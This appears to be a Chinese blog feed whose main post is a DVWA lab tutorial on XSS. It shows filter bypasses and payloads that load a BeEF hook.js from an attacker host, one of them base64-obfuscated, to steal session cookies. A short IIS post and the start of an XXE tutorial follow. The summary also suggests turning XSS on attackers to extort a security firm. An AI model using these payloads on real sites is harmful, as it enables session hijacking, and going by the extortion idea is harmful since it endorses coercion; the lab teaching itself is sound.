        <content type="html"><![CDATA[<h1 id="1-认识XSS"><a href="#1-认识XSS" class="headerlink" title="1. 认识XSS"></a>1. 认识XSS</h1><p>XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。 在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。 由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p><p>XSS 分类： 1.反射型 2.存储型 3.DOM型</p><p><strong>同源策略</strong></p><p>根据同源策略的规定，只有同协议、同域名、同端口三同的同源站点才能读取另一个同源站点的cookie等资源。</p><p><code>协议://domain:port/path/file</code> </p><p>注：js外链不受同源策略的影响。例如某网站引入的js文件，即使不是同源站点也能调用该js资源。</p><p><img src="/img/20230619211815.png"></p><h1 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h1><p>XSS （Stored）存储型攻击发生的具体情镜：</p><ul><li>黑客发现一个存在XSS漏洞的接口或页面，构造恶意代码（payload）后，将其插入到页面中使得所有浏览该页面的用户均受到安全威胁。</li></ul><p>首先我们进入到DVWA中将难度选择为LOW。之后我们进入XSS（Stored）中。在进行测试前我们可以先对提交点进行审查元素。 对着目标右键选择审查元素。</p><p><img src="/img/20230619213445.png"></p><p>接下来我们查看两个输入框的属性。 可以看到有输入长度的限制。其中 Name maxlength&#x3D;10 Message maxlength&#x3D;50。不难看出一个长度为10一个长度为50。</p><p>当然对于前端的长度限制我们是可以使用抓包工具去绕过。或者直接在本地修改html属性。如将maxlength改为100，这样前端的输入限制就可以轻松绕过了。</p><p>引申：在安全编码中，将安全的设置放置于用户端，虽然可以减轻服务器的工作量，但是如果服务端没有其他措施的话，则会很轻松的进行绕过。 我们首先尝试使用短 XSS payload 进行尝试。</p><p>payload ： <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="/img/20230619213612.png"></p><p>点击Sign Guestbook提交，成功弹窗，即证明此处存在xss漏洞，此时该恶意代码已被存储到服务端，我们切换到dvwa的其他模块，再切回xss存储模块仍然会弹窗。</p><p><img src="/img/20230619213854.png"></p><h1 id="3-使用beef盗取cookie"><a href="#3-使用beef盗取cookie" class="headerlink" title="3.使用beef盗取cookie"></a>3.使用beef盗取cookie</h1><p>下面我们使用beef配合完成攻击。 这里我们将payload插入页面后，当用户浏览了这个页面，<code>&lt;script&gt;</code>标签就会远程执行我们的beef上面的恶意js代码从而盗取cookie。<br>启动BEEF方法如下: </p><p>在终端输入 <code>beef-xss</code> ，会让你设置一个新的密码，直接输密码然后回车。</p><p><img src="/img/20230620171506.png"></p><p>然后自动弹出beef的页面在浏览器，输入账户beef和设置的密码登录。</p><p><img src="/img/20230620171646.png"></p><p>可以看到左侧有两个文件夹，第一个是上线浏览器的列表，第二个是离线浏览器的列表。</p><p>开启正式的攻击测试： 插入的payload为： <code>&lt;script src=&quot;http://192.168.31.182:3000/hook.js&quot;&gt;&lt;/script&gt;</code> ，其,192.168.31.182为beef工具所在的主机IP，根据实际情况给予修改即可。我们来到dvwa的反射型xss页面输入payload并提交。 </p><p><img src="/img/20230620172602.png"></p><p>查看页面源码，可以看到hook.js这个恶意外链已经被插入到源码里了。</p><p><img src="/img/20230620172842.png"></p><p>再进入之前打开的BEEF界面，可以看到目标浏览器已经上线了。</p><p><img src="/img/20230620173008.png"></p><p>接着查询我们收到的cookie：</p><p> 进入BEEF后我们先点击 <code>Command Browser</code> -&gt; <code>Commands</code> -&gt; 在<code>Searche</code>框输入<code>cookie</code>并回车 -&gt; 进入新的页面后点击右下角<code>Execute</code>-&gt;之后点击中间出现的记录 此时我们就可以在右侧看到我们收到的cookie了。</p><p><img src="/img/20230620173441.png"></p><p><img src="/img/20230620173551.png"></p><p> 完成全部操作后我们将得到一个格式为： phpsessid&#x3D;xxxxxxxxxx;security&#x3D;low样式的cookie。</p><p>再做另一个实验：当用户把页面关掉会发生什么？</p><p>来到浏览器，关闭dvwa的标签页，然后刷新（多刷新几次，因为有延迟）beef工具的页面会发现，刚刚上线的浏览器已经被移动到离线浏览器的文件夹下了。</p><p><img src="/img/20230620174054.png"></p><p>存储型xss也是同样的攻击链条，用户关闭页面同样会让浏览器在beef处于离线状态，但是存储型xss执行成功以后，只要用户再访问xss存储型模块，浏览器立马就会上线，不需要再次攻击，因为恶意代码被存储在服务端了。</p><h1 id="4-漏洞源码分析"><a href="#4-漏洞源码分析" class="headerlink" title="4.漏洞源码分析"></a>4.漏洞源码分析</h1><p>low级别，在DVWA点击ViewSource查看源码</p><p><img src="/img/20230620180611.png"></p><p>首先<code>if( isset( $_POST[ &#39;btnSign&#39; ] ) )</code>,这里是对表单提交的的name属性值为btnSign的值进行效验是否为空值，如果为空值则返回<code>flase</code>，不为空则继续进行下一步操作。 接下来我们可以看见<code>trim</code>函数，这个函数的主要作用就是去除其()内数据的两侧的空白字符或其他预定义字符。而这里处理的就是一post方式提交的name属性值为mtxMessage的数据，处理完后值赋给<code>$message</code>。<code>$name</code>同理。 接下来是<code>stripslashes</code>函数，这个函数一般情况下是伴随着<code>addslashes</code>函数出现，作用是删除由 <code>addslashes</code>函数添加的反斜杠。这里就是将上面由<code>addslashes</code>函数处理<code>$message</code>,<code>$name</code>进行再处理，去掉了\，然后再重新赋值给自己。 接下来就是运用<code>mysql_real_escape_string</code>函数处理<code>$name</code>, <code>mysql_real_escape_string</code>函数会转义 SQL 语句中使用的字符串中的特殊字符。 这些字符包括：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a 接下来就是拼接sql语句，赋值给$query,为下面执行插入数据做准备 紧接着就是一个使用or的赋值判断句，<code>mysql_query()</code> 函数作用执行()内的 MySQL语句进行查询，<code>die()</code> 函数作用是输出()内的数据，并退出当前脚本。在这里也就是先用<code>mysql_query()</code> 函数先行<code>$query</code>里的MySQL语句，如果语句格式没有错误的情况下则执行成功，返回true给$result,反之执行失败，则用die函数输出<code>mysql_error()</code>函数所获取的MySQL 操作产生的文本错误信息，并且退出语句。 分析到这里可以看到，LOW级别的数据处理和过滤过程没有针对XSS做过考量。所以插入的最低级的xss语句就可以获得对应的结果。</li></ul><h1 id="5-dvwa的中级别"><a href="#5-dvwa的中级别" class="headerlink" title="5.dvwa的中级别"></a>5.dvwa的中级别</h1><p>首先我们将DVWA的难度调整为MEDIUM。 </p><p>为了避免干扰，建议进行如下操作： 1 点击页面<code>Setup/Reset DB</code>，然后选择新页面中的<code>create/Reset Database</code> 2 通过重置数据库可以清除掉我们之前留下的记录。</p><p>接下来我们尝试插入代码。 做过多次测试其中发现name框存在<code>&lt;script&gt;</code>标签大小写绕过。 使用payload:<code>&lt;SCriPt&gt;alert(&#39;1&#39;)&lt;/SCriPt&gt;</code> 可以成功进行弹窗。</p><p><img src="/img/20230620180919.png"></p><p><img src="/img/20230620181028.png"></p><p>可以看到成功弹窗了，证明存在XSS，下面使用beef来配合攻击。</p><p>真实的窃取cookie： 首先插入payload:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCriPt</span>&gt;</span><span class="language-javascript"> src=<span class="string">&quot;http://192.168.31.182:3000/hook.js&quot;</span></span><span class="tag">&lt;/<span class="name">SCriPt</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后我们使用BEEF来盗取cookie。 步骤如之前一样，这里就不在赘述。这次大家可以注意到与上次不同cookie里面有一部分不同，等级从LOW变成了medium。 必须得到一个格式为php&#x3D;xxxxxxxxxx;security&#x3D;medium的cookie</p><p>View Source 查看源码:</p><p><img src="/img/20230620181250.png"></p><p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。 在这里就是过滤script这个字符串，意为把<code>&lt;scipt&gt;</code>字符串替换为空，留下其他内容。 因为没有对script的大小写进行限制和识别，这里可以用大小写混合， 比如<code>&lt;ScRiPt&gt;</code>标签进行绕过。</p><p>也可以通过<code>&lt;scr&lt;script&gt;ipt&gt;</code>这样格式的双写绕过。</p><h1 id="6-dvwa的高级别"><a href="#6-dvwa的高级别" class="headerlink" title="6.dvwa的高级别"></a>6.dvwa的高级别</h1><p>high级别的代码分析</p><p><img src="/img/20230620181705.png"></p><p>这里代码和medium整体上没有太大区别，就是多了一个正则表达式来配合<code>preg_replace()</code>函数对$name来进行过滤。 正则匹配的规则变化为<code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 可以看到匹配规则加上了<code>/i</code> 不区分大小写。<code>(.*)</code> 的作用是匹配任意数量的非回车的所有字符，所以在测试中也可以发现不管怎么构造payload,只要’’顺序’’出现<code>\&lt;script&gt;</code>都会被屏蔽，这里就输入一个进行尝试。 我们尝试payload: <code>&lt;&gt;ScRiPt11111&gt;</code> ，可以看到同样会被过滤掉，这也说明<code>script</code>标签我们是无法通过大小写的方式绕过了。在防御方面<code>正则表达式</code>有着得天独厚的优势，所以经常被用于php安全编程。 在xss的常见绕过的方式中，使用格式类似 <code>&lt;scr&lt;script&gt;ipt&gt;</code>的payload往往会有意外的收获。但此次测试因为使用了<code>(.*)</code>的模式，则无法进行绕过。</p><p>由于对script的关键字进行了彻底的过滤，为此我们使用payload：<code>&lt;img src=x onerror=alert(1)&gt;</code> 即可成功构造弹窗。</p><p><img src="/img/20230620181816.png"></p><p><img src="/img/20230620181832.png"></p><h1 id="7-存储型xss思考"><a href="#7-存储型xss思考" class="headerlink" title="7.存储型xss思考"></a>7.存储型xss思考</h1><p>低级别中插入弹窗的payload 随后我们切换到high级别 我们会发现依旧弹窗：）</p><p>假如说我们在工作中，生产环境被攻击插入payload，而没有清除数据库，是否还会继续产生危害？</p><p>进阶的思考—-XSS盲打</p><p>盲打只是一种惯称的说法，就是不知道后台不知道有没有xss存在的情况下，不顾一切的输入xss代码在留言啊，feedback啊之类的地方，尽可能多的尝试xss的语句与语句的存在方式，就叫盲打。 “xss盲打”是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入了带真实攻击功能的xss攻击代码（通常是使用script标签引入远程的js）的数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的“真实攻击功能”。 通俗讲就是见到输入框就输入提前准备的 xss代码， 通常是使用script标签引入远程的js代码，当有后台人员审核提交数据时候，点击了提交的数据，触发获取到有价值信息 。</p><h1 id="8-self-xss"><a href="#8-self-xss" class="headerlink" title="8 self-xss"></a>8 self-xss</h1><p>假如京东的个人订单页面存在xss，有危害吗？</p><p>答案：京东的个人订单页面只有自己能看到，所以这是不被认为有危害的，其专业名词为self-xss。</p><p><a href="http://hzhcontrols.com/new-1456458.html">实战漏洞挖掘-csrf+存储selfxss漏洞组合拳-WinFrom控件库|.net开源控件库|HZHControls官网</a></p><h1 id="9更多的思路"><a href="#9更多的思路" class="headerlink" title="9更多的思路"></a>9更多的思路</h1><p>在dvwa的高等级当中，由于代码所使用的逻辑通过如下的代码过滤掉了所有基于script标签的可能性。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); </span><br><span class="line"></span><br><span class="line">preg_replace       通过正则表达式替换文字内容</span><br><span class="line">/i               模式中的字符将同时匹配大小写字母。</span><br></pre></td></tr></table></figure><p>所以当我们试图进行绕过的尝试输入<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/script&gt;</code> 后，留在网页中的内容同样只剩余alert(1)的内容。<br>而通过bp扫描器进行漏洞检测，则可以得到相应的payload的攻击方式：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">a</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以通过攻击的演示，那么我们可以发现并不止于script的利用方式。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1 dvwa低级别：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">s</span>=<span class="string">createElement(</span>&#x27;<span class="attr">script</span>&#x27;);<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">&#x27;http://192.168.0.231:3000/hook.js&#x27;</span>;&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2 dvwa低级别：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vMTkyLjE2OC4wLjIzMTozMDAwL2hvb2suanMn</span>&#x27;))&gt;</span></span><br><span class="line"></span><br><span class="line">3 dvwa低级别：</span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">s</span>=<span class="string">createElement(</span>&#x27;<span class="attr">script</span>&#x27;);<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">&#x27;http://192.168.0.231:3000/hook.js&#x27;</span>;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server</span><br><span class="line"></span><br><span class="line">通过文件上传浏览页面触发cookie窃取</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://book.fsec.io/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>点我链接给你好看<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实验中，针对高级别的payload存在不完善地方。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://book.fsec.io/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>点我链接给你好看<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>原理：跨站脚本攻击，因为js外链不受同源策略影响，并且网站没有对用户输入做严谨的过滤，所以插入恶意的js代码使浏览器产生歧义，导致插入的恶意代码被执行，然后攻击者可利用恶意代码窃取cookie。</p><p>beef与xss平台的使用场景：在没有外网的环境下，无法用xss平台，就用beef。xss平台只能打靶场，严禁代入真实生产环境，因为会把盗取到的信息完全展现给xss平台的拥有者，最好是自己搭一个。</p><p>例外：self-xss和CSRF；插入链接形式的代码诱使用户点击；盲打见框就插。</p><p>xss漏洞正向利用的方案：防守方在自己网站上挂一个js恶意代码，不是为了窃取cookie，因为是自己的网站，偷自己网站的cookie没用，这是为了获取攻击方的ip，并且可以利用xss平台的截图功能截取攻击方的浏览器屏幕，假如对方有一个页面打开的是奇安信什么的，就可以认为是奇安信的工程师发动了攻击，向奇安信讹钱。相当于一个免费的删减版蜜罐。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Server 2012安装IIS</title>
      <link href="/2022/05/18/Windows%20Server%202012%E5%AE%89%E8%A3%85IIS/"/>
      <url>/2022/05/18/Windows%20Server%202012%E5%AE%89%E8%A3%85IIS/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/20220616105947.png"></p><p><img src="/img/20220616110031.png"></p><p><img src="/img/20220616110143.png"></p><p><img src="/img/20220616110210.png"></p><p><img src="/img/20220616110322.png"></p><p><img src="/img/20220616110342.png"></p><p><img src="/img/20220616110414.png"></p><p><img src="/img/20220616110500.png"></p><p><img src="/img/20220616110524.png"></p><p><img src="/img/20220616110559.png"></p><p><img src="/img/20220616110625.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2022/05/16/XXE/"/>
      <url>/2022/05/16/XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XML外部实体注入漏洞。</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p><p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h2 id="1-XML基础"><a href="#1-XML基础" class="headerlink" title="1 XML基础"></a>1 XML基础</h2><p>要了解XXE漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。</p><h3 id="1-1-XML背景知识"><a href="#1-1-XML背景知识" class="headerlink" title="1.1 XML背景知识"></a>1.1 XML背景知识</h3><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p><h3 id="1-2-XML语法结构"><a href="#1-2-XML语法结构" class="headerlink" title="1.2 XML语法结构"></a>1.2 XML语法结构</h3><p><strong>XML</strong> 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语 言，被设计用来传输和存储数据。</p><p>可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</p><p><strong>XML文档结构</strong>包括<strong>XML声明</strong>、<strong>DTD文档类型定义（可选）</strong>、<strong>文档元素</strong>。</p><p>目前，XML文 件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 </p><p>XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>                             <span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>                                                <span class="comment">&lt;!--DTD(文档类型定义)--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>                                            <span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XML 文档在开头有 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。</p><p>除了可选的开头外，XML 语法主要有以下的特性： </p><ul><li><p>所有 XML 元素都须有关闭标签 </p></li><li><p>XML 标签对大小写敏感 </p></li><li><p>XML 必须正确地嵌套 </p></li><li><p>XML 文档必须有根元素 </p></li><li><p>XML 的属性值需要加引号</p></li><li><p>实体引用（在标签属性，以及对应的位置值可能会出现<code>&lt;</code> <code>&gt;</code> 符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应html的实体对应的表示，比如<code>&lt;</code> 符号对应的实体就是<code>lt</code> ，<code>&gt;</code> 符号对应的实体就是<code>gt</code> ）</p></li></ul><p><strong>DTD是什么？</strong> </p><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD文档类型定义（document type definition） 的东西控制的。DTD用来描述xml文档的结构。</p><p>一个DTD文档包含：元素的定义规则；元素之间的关系规则；属性的定义规则。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p><strong>内部声明DTD</strong></p><p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code> </p><p><strong>引用外部实体</strong></p><p>XML外部实体的定义和调用方式： <code>&lt;!ENTITY 根元素 SYSTEM &quot;文件名&quot;&gt;</code> </p><p>例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line">&lt;! DOCTYPE students SYSTEM &quot;StudentDTD.dtd&quot;&gt;    <span class="comment">&lt;!--引用students实体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">students</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">student</span> <span class="attr">sno</span>=<span class="string">&quot;_0010&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Mark<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>23<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span>English<span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span>Math<span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">student</span> <span class="attr">sno</span>=<span class="string">&quot;_0109&quot;</span> <span class="attr">role</span>=<span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span> <span class="attr">sex</span>=<span class="string">&quot;Male&quot;</span>&gt;</span>Andy<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>19<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span>Chinese<span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="symbol">&amp;school;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">students</span>&gt;</span></span><br></pre></td></tr></table></figure><p>StudentDTD.dtd 文件内容：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">students</span> (<span class="keyword">student</span>)*&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">student</span> (<span class="keyword">name</span>,<span class="keyword">age</span>,<span class="keyword">course</span>+,<span class="keyword">school</span>?)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST <span class="keyword">student</span> <span class="keyword">sno</span> <span class="keyword">ID</span> <span class="keyword">#REQUIRED</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST <span class="keyword">student</span> <span class="keyword">role</span> <span class="keyword">CDATA</span> <span class="keyword">#FIXED</span> <span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST <span class="keyword">name</span> <span class="keyword">sex</span> (<span class="keyword">MaleFemale</span>) <span class="keyword">#IMPLIED</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">age</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">course</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELENENT <span class="keyword">school</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">school</span> <span class="string">&quot;PKU&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTD 数据类型</strong></p><p>PCDATA 的意思是被解析的字符数据，是会被解析器解析的文本。</p><p>CDATA 的意思是字符数据，是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><p><strong>DTD 实体介绍</strong></p><p>实体是用于定义引用普通文本或者特殊字符的快捷方式的变量。</p><p>在DTD 中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符<code>%</code>开始外，其它实体都以字符<code>&amp;</code>开始，以字符<code>;</code>结束。</p><p>内部实体：</p><p>语法结构：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code> </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line">&lt; !DOCTYPE root [</span><br><span class="line"><span class="meta">&lt;!ENTITY x <span class="string">&quot;First!&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY y <span class="string">&quot;Second!&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;x;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span><span class="tag">&lt;<span class="name">y</span>&gt;</span><span class="symbol">&amp;y;</span><span class="tag">&lt;/<span class="name">y</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部实体：</p><p>语法结构：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code> </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version= <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;other.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部参数实体：</p><p>语法结构：<code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code> </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> <span class="string">&quot;Hello&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param2</span> <span class="string">&quot;World&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;./info.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span 